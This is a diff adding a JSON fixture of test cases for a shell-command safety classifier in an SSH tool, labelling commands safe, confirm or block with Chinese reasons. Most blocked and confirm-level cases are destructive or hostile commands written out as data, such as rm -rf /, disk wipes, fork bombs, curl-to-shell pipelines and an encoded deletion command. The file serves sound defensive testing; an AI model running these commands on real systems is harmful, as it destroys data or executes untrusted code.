@@ -1,0 +1,2527 @@
+{
+ "_comment": "前後端共用案例：src/shellGuard.test.ts 與 src-tauri/src/ssh/shell_guard.rs 跑同一份。改規則要兩邊一起改，再重新核對這份檔。",
+ "classify": [
+  {
+   "cmd": "ls -la",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "cat /etc/os-release",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "systemctl status nginx",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "df -h",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "journalctl -n 50 -u nginx --no-pager",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "echo hi > /dev/null",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "curl https://example.com/x -o f",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "curl -sSL https://x | python3 -m json.tool",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "git push",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "git status",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "git clean -n",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "kill -9 12345",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "mysql -e \"SELECT 1\"",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "top -b -n 1",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "docker ps -a",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "docker compose down",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "apt list --installed",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "fdisk -l",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "cd /tmp",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "npm install",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "pip install -r requirements.txt",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "grep -r foo . | head -n 20",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "cp /etc/hosts ./hosts.bak",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "sed -n '1,10p' /etc/nginx/nginx.conf",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "echo x >> /etc/hosts",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "command -v rm",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "tar czf backup.tgz app",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "echo $#",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "   ",
+   "level": "safe",
+   "reasons": [],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf /",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf /*",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -fr ~",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf \"$HOME\"",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf ~/*",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf .",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf ./",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -r --no-preserve-root /var/tmp/x",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf /etc",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf /usr/",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "/bin/rm -rf /",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "\\rm -rf /",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "dd if=x of=/dev/sda",
+   "level": "block",
+   "reasons": [
+    "以 dd 寫入資料",
+    "直接寫入磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "dd if=/dev/zero of=/dev/nvme0n1 bs=1M",
+   "level": "block",
+   "reasons": [
+    "以 dd 寫入資料",
+    "直接寫入磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo x > /dev/sda",
+   "level": "block",
+   "reasons": [
+    "直接寫入磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cat img > /dev/mmcblk0",
+   "level": "block",
+   "reasons": [
+    "直接寫入磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cp img /dev/sdb",
+   "level": "block",
+   "reasons": [
+    "直接寫入磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "mkfs.ext4 /dev/sdb1",
+   "level": "block",
+   "reasons": [
+    "格式化 / 抹除磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "mkfs -t xfs /dev/sdc",
+   "level": "block",
+   "reasons": [
+    "格式化 / 抹除磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "wipefs -a /dev/sda",
+   "level": "block",
+   "reasons": [
+    "格式化 / 抹除磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "shred -n 3 /dev/sda",
+   "level": "block",
+   "reasons": [
+    "格式化 / 抹除磁碟裝置"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod -R 755 /",
+   "level": "block",
+   "reasons": [
+    "遞迴變更根目錄權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chown -R www-data:www-data /",
+   "level": "block",
+   "reasons": [
+    "遞迴變更根目錄權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": ":(){ :|:& };:",
+   "level": "block",
+   "reasons": [
+    "fork bomb（會耗盡系統資源）"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "bomb(){ bomb|bomb& };bomb",
+   "level": "block",
+   "reasons": [
+    "fork bomb（會耗盡系統資源）"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "ls && rm -rf /",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cd /tmp; rm -rf /",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo $(rm -rf /)",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo `rm -rf /`",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "bash -c \"rm -rf /\"",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "su -c 'rm -rf /'",
+   "level": "block",
+   "reasons": [
+    "以 root 權限執行",
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "sh -c 'cd /tmp && rm -rf /'",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "find / -exec rm -rf / \\;",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf \\\n/",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cat <<EOF | sh\nrm -rf /\nEOF",
+   "level": "block",
+   "reasons": [
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "sudo rm -rf /",
+   "level": "block",
+   "reasons": [
+    "以 root 權限執行",
+    "遞迴刪除根目錄或家目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod -R 777 /",
+   "level": "block",
+   "reasons": [
+    "遞迴變更根目錄權限",
+    "開放寫入權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "sudo apt update",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "doas apt update",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "pkexec systemctl status x",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "sudo -u www-data php artisan migrate",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf ./dist",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf /tmp/cache",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf /var/www/old",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -r build",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm --recursive build",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm file.txt",
+   "level": "confirm",
+   "reasons": [
+    "刪除檔案"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "unlink x",
+   "level": "confirm",
+   "reasons": [
+    "刪除檔案"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -f x",
+   "level": "confirm",
+   "reasons": [
+    "強制或批次刪除檔案"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm *.log",
+   "level": "confirm",
+   "reasons": [
+    "強制或批次刪除檔案"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm \"$f\"",
+   "level": "confirm",
+   "reasons": [
+    "強制或批次刪除檔案"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf \"$DIR\"",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除",
+    "目標為變數，未設定時可能刪到根目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf \"$DIR/\"",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除",
+    "目標為變數，未設定時可能刪到根目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rm -rf \"$DIR/cache\"",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "find /var/log -name '*.gz' -delete",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "find . -name '*.tmp' -exec rm {} \\;",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "find . -type f -exec rm -f {} +",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "find . -name '*.log' | xargs rm",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "ls | xargs -I{} rm -rf {}",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "rsync -a --delete src/ dst/",
+   "level": "confirm",
+   "reasons": [
+    "遞迴刪除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "dd if=/dev/zero of=out.img bs=1M count=10",
+   "level": "confirm",
+   "reasons": [
+    "以 dd 寫入資料"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "truncate -s 0 app.log",
+   "level": "confirm",
+   "reasons": [
+    "截斷檔案內容"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "fdisk /dev/sda",
+   "level": "confirm",
+   "reasons": [
+    "磁碟分割 / 格式化 / 抹除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "parted /dev/sda mklabel gpt",
+   "level": "confirm",
+   "reasons": [
+    "磁碟分割 / 格式化 / 抹除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "shred secrets.txt",
+   "level": "confirm",
+   "reasons": [
+    "磁碟分割 / 格式化 / 抹除"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo x > /etc/hosts",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cat > /etc/nginx/conf.d/x.conf <<EOF",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo 1 > /proc/sys/vm/drop_caches",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo x >/boot/x",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo x &> /etc/x",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo x | tee /etc/apt/sources.list.d/x.list",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "sed -i 's/a/b/' /etc/nginx/nginx.conf",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "cp x /usr/local/bin/",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "mv nginx.conf /etc/nginx/nginx.conf",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "curl -fsSL https://x -o /usr/local/bin/tool",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "curl -sSLo /usr/local/bin/tool https://x",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "wget -O /usr/local/bin/tool https://x",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "ln -sf /opt/x /usr/bin/x",
+   "level": "confirm",
+   "reasons": [
+    "寫入系統目錄"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "curl -s https://x | sh",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "curl -fsSL https://x | sudo bash",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行",
+    "透過網路下載並直接執行"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "curl -fsSL https://x | sudo -E bash -",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行",
+    "透過網路下載並直接執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "wget -qO- https://x | sh",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "curl https://x | python3",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "curl https://x | python3 -",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "bash <(curl -s https://x)",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "sh <(wget -qO- https://x)",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "bash -c \"$(curl -fsSL https://x)\"",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "sudo bash -c \"$(curl -fsSL https://x)\"",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行",
+    "以 root 權限執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "source <(curl -s https://x)",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": ". <(curl -s https://x)",
+   "level": "confirm",
+   "reasons": [
+    "透過網路下載並直接執行"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "echo cm0gLXJmIC8K | base64 -d | bash",
+   "level": "confirm",
+   "reasons": [
+    "執行編碼過的指令"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "echo x | base64 --decode | sh",
+   "level": "confirm",
+   "reasons": [
+    "執行編碼過的指令"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "eval \"$(ssh-agent -s)\"",
+   "level": "confirm",
+   "reasons": [
+    "執行動態組出的指令（eval）"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git push --force",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git push -f origin main",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git push --force-with-lease",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git push origin :old-branch",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git -C /srv/app push -f",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git reset --hard HEAD~1",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git clean -fd",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git checkout -- .",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git checkout .",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git restore .",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git branch -D feature",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "git stash drop",
+   "level": "confirm",
+   "reasons": [
+    "覆寫 git 歷史或丟棄變更"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "mysql -e \"DROP TABLE t\"",
+   "level": "confirm",
+   "reasons": [
+    "執行破壞性資料庫語句"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "mysql -u root -e \"TRUNCATE TABLE t\"",
+   "level": "confirm",
+   "reasons": [
+    "執行破壞性資料庫語句"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "psql -c \"delete from users\"",
+   "level": "confirm",
+   "reasons": [
+    "執行破壞性資料庫語句"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "mongosh --eval \"db.users.deleteMany({})\"",
+   "level": "confirm",
+   "reasons": [
+    "執行破壞性資料庫語句"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "redis-cli flushall",
+   "level": "confirm",
+   "reasons": [
+    "執行破壞性資料庫語句"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "redis-cli -h 10.0.0.1 FLUSHDB",
+   "level": "confirm",
+   "reasons": [
+    "執行破壞性資料庫語句"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "dropdb app",
+   "level": "confirm",
+   "reasons": [
+    "執行破壞性資料庫語句"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "kill -9 -1",
+   "level": "confirm",
+   "reasons": [
+    "終止所有程序"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "kill -TERM -1",
+   "level": "confirm",
+   "reasons": [
+    "終止所有程序"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "kill 1",
+   "level": "confirm",
+   "reasons": [
+    "終止所有程序"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "killall node",
+   "level": "confirm",
+   "reasons": [
+    "依名稱終止程序"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "pkill -f gunicorn",
+   "level": "confirm",
+   "reasons": [
+    "依名稱終止程序"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "systemctl stop nginx",
+   "level": "confirm",
+   "reasons": [
+    "停止、重啟或停用服務"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "systemctl restart nginx",
+   "level": "confirm",
+   "reasons": [
+    "停止、重啟或停用服務"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "systemctl disable --now x",
+   "level": "confirm",
+   "reasons": [
+    "停止、重啟或停用服務"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "systemctl mask x",
+   "level": "confirm",
+   "reasons": [
+    "停止、重啟或停用服務"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "service nginx stop",
+   "level": "confirm",
+   "reasons": [
+    "停止、重啟或停用服務"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "sudo systemctl restart nginx",
+   "level": "confirm",
+   "reasons": [
+    "以 root 權限執行",
+    "停止、重啟或停用服務"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "reboot",
+   "level": "confirm",
+   "reasons": [
+    "關機或重新開機"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "shutdown -h now",
+   "level": "confirm",
+   "reasons": [
+    "關機或重新開機"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "init 6",
+   "level": "confirm",
+   "reasons": [
+    "關機或重新開機"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "systemctl poweroff",
+   "level": "confirm",
+   "reasons": [
+    "關機或重新開機"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "iptables -F",
+   "level": "confirm",
+   "reasons": [
+    "變更防火牆規則"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "iptables -P INPUT DROP",
+   "level": "confirm",
+   "reasons": [
+    "變更防火牆規則"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "nft flush ruleset",
+   "level": "confirm",
+   "reasons": [
+    "變更防火牆規則"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "ufw disable",
+   "level": "confirm",
+   "reasons": [
+    "變更防火牆規則"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "firewall-cmd --panic-on",
+   "level": "confirm",
+   "reasons": [
+    "變更防火牆規則"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "crontab -r",
+   "level": "confirm",
+   "reasons": [
+    "清除排程"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "history -c",
+   "level": "confirm",
+   "reasons": [
+    "清除指令歷史"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "unset HISTFILE",
+   "level": "confirm",
+   "reasons": [
+    "清除指令歷史"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "HISTFILE=/dev/null bash",
+   "level": "confirm",
+   "reasons": [
+    "清除指令歷史"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "export HISTFILE=/dev/null",
+   "level": "confirm",
+   "reasons": [
+    "清除指令歷史"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "apt remove nginx",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "apt-get purge -y nginx",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "apt autoremove",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "dnf erase x",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "apk del x",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "npm uninstall x",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "pip uninstall -y x",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "pacman -Rns x",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "dpkg -r x",
+   "level": "confirm",
+   "reasons": [
+    "移除套件"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "docker system prune -a",
+   "level": "confirm",
+   "reasons": [
+    "刪除容器 / 映像 / 資料卷"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "docker rm -f web",
+   "level": "confirm",
+   "reasons": [
+    "刪除容器 / 映像 / 資料卷"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "docker rmi -f img",
+   "level": "confirm",
+   "reasons": [
+    "刪除容器 / 映像 / 資料卷"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "docker volume rm data",
+   "level": "confirm",
+   "reasons": [
+    "刪除容器 / 映像 / 資料卷"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "docker compose down -v",
+   "level": "confirm",
+   "reasons": [
+    "刪除容器 / 映像 / 資料卷"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "docker-compose down --volumes",
+   "level": "confirm",
+   "reasons": [
+    "刪除容器 / 映像 / 資料卷"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "kubectl delete pod x",
+   "level": "confirm",
+   "reasons": [
+    "刪除叢集 / 雲端資源"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "helm uninstall x",
+   "level": "confirm",
+   "reasons": [
+    "刪除叢集 / 雲端資源"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "terraform destroy",
+   "level": "confirm",
+   "reasons": [
+    "刪除叢集 / 雲端資源"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "userdel -r bob",
+   "level": "confirm",
+   "reasons": [
+    "變更使用者帳號"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "passwd bob",
+   "level": "confirm",
+   "reasons": [
+    "變更使用者帳號"
+   ],
+   "interactive": true
+  },
+  {
+   "cmd": "usermod -L bob",
+   "level": "confirm",
+   "reasons": [
+    "變更使用者帳號"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chpasswd < users.txt",
+   "level": "confirm",
+   "reasons": [
+    "變更使用者帳號"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "umount /mnt/data",
+   "level": "confirm",
+   "reasons": [
+    "掛載 / 卸載檔案系統"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "mount -o remount,rw /",
+   "level": "confirm",
+   "reasons": [
+    "掛載 / 卸載檔案系統"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod -R 755 /var/www",
+   "level": "confirm",
+   "reasons": [
+    "遞迴變更權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chown -R deploy:deploy /srv/app",
+   "level": "confirm",
+   "reasons": [
+    "遞迴變更權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod 777 x",
+   "level": "confirm",
+   "reasons": [
+    "開放寫入權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod 666 x",
+   "level": "confirm",
+   "reasons": [
+    "開放寫入權限"
+   ],
+   "interactive": false
+  },
+  {
+   "cmd": "chmod o+w x",
+   "level": "confirm",
+   "reasons": [
+    "開放寫入權限"
+   ],
+   "interactive": false
+  },
